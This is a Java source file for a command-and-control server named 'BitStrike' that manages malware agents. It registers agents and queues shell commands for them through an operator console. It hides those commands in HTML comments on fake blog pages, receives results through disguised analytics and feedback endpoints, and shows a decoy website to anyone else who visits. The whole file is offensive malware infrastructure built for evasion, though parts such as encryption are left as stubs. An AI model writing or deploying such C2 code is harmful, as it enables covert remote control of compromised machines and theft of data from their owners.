import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpsServer;
import com.sun.net.httpserver.HttpsConfigurator;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import java.io.*;
import java.net.InetSocketAddress;
import java.security.KeyStore;
import java.util.Map;
import java.util.Queue;
import java.util.Scanner;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.Date;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.util.HashMap;

/**
 * BitStrike Command & Control Server
 * Handles agent connections and command distribution
 */
class C2Server {
    private static final int DEFAULT_PORT = 8443;
    private final Map<String, AgentInfo> agents = new ConcurrentHashMap<>();
    private final Queue<Command> commandQueue = new ConcurrentLinkedQueue<>();
    private final Map<String, SecretKey> agentKeys = new ConcurrentHashMap<>();
    private boolean running = false;
    private HttpsServer server;

    public C2Server() {
        // Constructor is now empty
    }

    public void start(int port) {
        try {
            // Setup SSL context for HTTPS
            SSLContext sslContext = setupSSLContext();

            // Create HTTPS server
            server = HttpsServer.create(new InetSocketAddress(port), 0);
            server.setHttpsConfigurator(new HttpsConfigurator(sslContext));

            // Add context handlers
            server.createContext("/blog/post/comment", new AgentRegistrationHandler());
            server.createContext("/blog/recent-posts", new CommandDeliveryHandler());
            server.createContext("/api/analytics/event", new ResultCollectionHandler());
            server.createContext("/feedback/submit", new ResultCollectionHandler());

            // Add a default handler for any other requests to appear as a normal web server
            server.createContext("/", new DefaultHandler());

            // Set executor
            server.setExecutor(Executors.newCachedThreadPool());
            server.start();

            running = true;
            System.out.println("BitStrike C2 server started on port " + port);

            // Start command console
            startCommandConsole();

        } catch (Exception e) {
            System.err.println("Error starting server: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public void stop() {
        if (running && server != null) {
            server.stop(0);
            running = false;
            System.out.println("BitStrike C2 server stopped");
        }
    }

    // Method to set up SSL context
    private SSLContext setupSSLContext() throws Exception {
        // Generate a self-signed certificate for development
        // In production, you'd use a proper certificate

        try {
            // Check if keystore exists
            File keystoreFile = new File("keystore.jks");
            if (!keystoreFile.exists()) {
                System.out.println("Keystore file not found. Please create one using:");
                System.out.println("keytool -genkeypair -alias bitstrike -keyalg RSA -keysize 2048 -keystore keystore.jks");
                System.exit(1);
            }

            // Load the keystore
            KeyStore ks = KeyStore.getInstance("JKS");
            char[] password = "password".toCharArray(); // Replace with secure password management
            try (FileInputStream fis = new FileInputStream(keystoreFile)) {
                ks.load(fis, password);
            }

            // Set up key manager factory
            KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
            kmf.init(ks, password);

            // Set up SSL context
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(kmf.getKeyManagers(), null, null);

            return sslContext;
        } catch (Exception e) {
            System.err.println("Error setting up SSL: " + e.getMessage());
            e.printStackTrace();
            throw e;
        }
    }

    // Handler for agent registration
    class AgentRegistrationHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            try {
                // Read request body
                String requestBody = new String(exchange.getRequestBody().readAllBytes());

                // Extract form data parameters
                Map<String, String> params = parseFormData(requestBody);

                // In real implementation, decrypt the encrypted data
                String encryptedData = params.getOrDefault("comment", "");
                // For demo, assuming the beacon ID is embedded in the data
                String beaconId = "agent-" + System.currentTimeMillis(); // In real implementation, extract from decrypted data

                // Store agent information
                agents.putIfAbsent(beaconId, new AgentInfo(beaconId));
                agents.get(beaconId).updateLastSeen();

                System.out.println("Agent registered: " + beaconId);

                // Send success response that looks like a blog comment submission
                String response = "<html><body><h2>Thank you for your comment!</h2><p>Your comment has been submitted for moderation.</p></body></html>";
                exchange.getResponseHeaders().set("Content-Type", "text/html");
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();

            } catch (Exception e) {
                System.err.println("Error handling registration: " + e.getMessage());
                String response = "Error processing your request";
                exchange.getResponseHeaders().set("Content-Type", "text/plain");
                exchange.sendResponseHeaders(500, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }
    }

    // Handler for delivering commands to agents
    class CommandDeliveryHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            try {
                // Extract beacon ID from cookies
                String cookies = exchange.getRequestHeaders().getFirst("Cookie");
                String beaconId = extractBeaconIdFromCookies(cookies);

                // Update last seen timestamp
                if (agents.containsKey(beaconId)) {
                    agents.get(beaconId).updateLastSeen();
                } else {
                    // Unknown agent, send generic response
                    sendGenericResponse(exchange);
                    return;
                }

                // Check if there are commands for this agent
                Command command = findCommandForAgent(beaconId);

                if (command != null) {
                    // We have a command for this agent
                    // In real implementation, encrypt the command
                    String encodedCommand = "base64encodedcommand"; // In real implementation, encrypt and encode

                    // Send page with hidden command
                    String response = "<html><body><h1>Recent Posts</h1>" +
                            "<p>Check out our latest articles and updates.</p>" +
                            "<!--CMD:" + encodedCommand + "-->" +
                            "<div class=\"posts\">...</div></body></html>";

                    exchange.getResponseHeaders().set("Content-Type", "text/html");
                    exchange.sendResponseHeaders(200, response.length());
                    try (OutputStream os = exchange.getResponseBody()) {
                        os.write(response.getBytes());
                    }

                    System.out.println("Command sent to agent: " + beaconId);
                } else {
                    // No command, send generic response
                    sendGenericResponse(exchange);
                }

            } catch (Exception e) {
                System.err.println("Error delivering command: " + e.getMessage());
                sendGenericResponse(exchange);
            }
        }

        private void sendGenericResponse(HttpExchange exchange) throws IOException {
            String response = "<html><body><h1>Recent Posts</h1>" +
                    "<p>Check out our latest articles and updates.</p>" +
                    "<div class=\"posts\">No new posts available.</div></body></html>";

            exchange.getResponseHeaders().set("Content-Type", "text/html");
            exchange.sendResponseHeaders(200, response.length());
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(response.getBytes());
            }
        }
    }

    // Handler for collecting command results
    class ResultCollectionHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            try {
                // Read request body
                String requestBody = new String(exchange.getRequestBody().readAllBytes());

                // Extract beacon ID from cookies
                String cookies = exchange.getRequestHeaders().getFirst("Cookie");
                String beaconId = extractBeaconIdFromCookies(cookies);

                // Update last seen timestamp
                if (agents.containsKey(beaconId)) {
                    agents.get(beaconId).updateLastSeen();

                    // In real implementation, decrypt and process the results
                    // For now, just log that we received data
                    System.out.println("Received result from agent: " + beaconId);
                    System.out.println("Data length: " + requestBody.length() + " bytes");
                }

                // Send generic success response
                String response = "{\"status\":\"success\"}";
                exchange.getResponseHeaders().set("Content-Type", "application/json");
                exchange.sendResponseHeaders(200, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }

            } catch (Exception e) {
                System.err.println("Error processing result: " + e.getMessage());
                String response = "{\"status\":\"error\"}";
                exchange.getResponseHeaders().set("Content-Type", "application/json");
                exchange.sendResponseHeaders(500, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            }
        }
    }

    // Default handler for any other requests
    class DefaultHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String path = exchange.getRequestURI().getPath();

            // Make it look like a real website
            if (path.equals("/") || path.equals("/index.html")) {
                String response = "<html><body><h1>Welcome to Our Website</h1>" +
                        "<p>This is a sample website for demonstration purposes.</p></body></html>";

                exchange.getResponseHeaders().set("Content-Type", "text/html");
                exchange.sendResponseHeaders(200, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            } else {
                // 404 for anything else
                String response = "<html><body><h1>404 Not Found</h1>" +
                        "<p>The requested resource could not be found.</p></body></html>";

                exchange.getResponseHeaders().set("Content-Type", "text/html");
                exchange.sendResponseHeaders(404, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            }
        }
    }

    // Start a simple command console for interaction
    private void startCommandConsole() {
        new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            System.out.println("BitStrike C2 Console");
            System.out.println("Type 'help' for commands");

            while (running) {
                System.out.print("> ");
                String input = scanner.nextLine();

                if (input.equals("exit")) {
                    stop();
                    break;
                } else if (input.equals("help")) {
                    System.out.println("Available commands:");
                    System.out.println("  agents - List connected agents");
                    System.out.println("  exec <agent_id> <command> - Queue command for agent");
                    System.out.println("  kill <agent_id> - Instruct agent to terminate");
                    System.out.println("  clear - Clear the console");
                    System.out.println("  exit - Exit the console and stop the server");
                } else if (input.equals("agents")) {
                    if (agents.isEmpty()) {
                        System.out.println("No agents connected");
                    } else {
                        System.out.println("Connected agents:");
                        agents.forEach((id, info) -> {
                            System.out.printf("  %s - Last seen: %s%n", id, info.lastSeen);
                        });
                    }
                } else if (input.startsWith("exec ")) {
                    String[] parts = input.split(" ", 3);
                    if (parts.length < 3) {
                        System.out.println("Usage: exec <agent_id> <command>");
                        continue;
                    }

                    String agentId = parts[1];
                    String command = parts[2];

                    if (agents.containsKey(agentId)) {
                        commandQueue.add(new Command(agentId, command));
                        System.out.println("Command queued for agent " + agentId);
                    } else {
                        System.out.println("Agent not found: " + agentId);
                    }
                } else if (input.equals("clear")) {
                    // Clear console (works in some terminals)
                    System.out.print("\033[H\033[2J");
                    System.out.flush();
                } else if (input.startsWith("kill ")) {
                    String agentId = input.substring(5).trim();
                    if (agents.containsKey(agentId)) {
                        commandQueue.add(new Command(agentId, "terminate"));
                        System.out.println("Termination command queued for agent " + agentId);
                    } else {
                        System.out.println("Agent not found: " + agentId);
                    }
                } else if (!input.trim().isEmpty()) {
                    System.out.println("Unknown command. Type 'help' for available commands.");
                }
            }

            scanner.close();

        }).start();
    }

    // Helper methods
    private Map<String, String> parseFormData(String formData) {
        Map<String, String> result = new HashMap<>();
        String[] pairs = formData.split("&");
        for (String pair : pairs) {
            int idx = pair.indexOf("=");
            if (idx > 0) {
                String key = pair.substring(0, idx);
                String value = pair.substring(idx + 1);
                // In real implementation, URL decode the values
                result.put(key, value);
            }
        }
        return result;
    }

    private String extractBeaconIdFromCookies(String cookies) {
        if (cookies == null) {
            return "unknown";
        }

        String[] cookiePairs = cookies.split(";");
        for (String cookie : cookiePairs) {
            cookie = cookie.trim();
            if (cookie.startsWith("session_id=")) {
                return cookie.substring("session_id=".length());
            }
        }

        return "unknown";
    }

    private Command findCommandForAgent(String agentId) {
        for (Command cmd : commandQueue) {
            if (cmd.agentId.equals(agentId)) {
                commandQueue.remove(cmd);
                return cmd;
            }
        }
        return null;
    }

    // Helper classes
    static class AgentInfo {
        String beaconId;
        Date lastSeen;
        Map<String, String> systemInfo;

        AgentInfo(String beaconId) {
            this.beaconId = beaconId;
            this.lastSeen = new Date();
            this.systemInfo = new HashMap<>();
        }

        void updateLastSeen() {
            this.lastSeen = new Date();
        }
    }

    static class Command {
        String agentId;
        String commandText;
        Date timestamp;

        Command(String agentId, String commandText) {
            this.agentId = agentId;
            this.commandText = commandText;
            this.timestamp = new Date();
        }
    }

    // Main method
    public static void main(String[] args) {
        int port = DEFAULT_PORT;
        if (args.length > 0) {
            try {
                port = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                System.err.println("Invalid port number, using default: " + DEFAULT_PORT);
                port = DEFAULT_PORT;
            }
        }

        C2Server server = new C2Server();
        server.start(port);
    }
}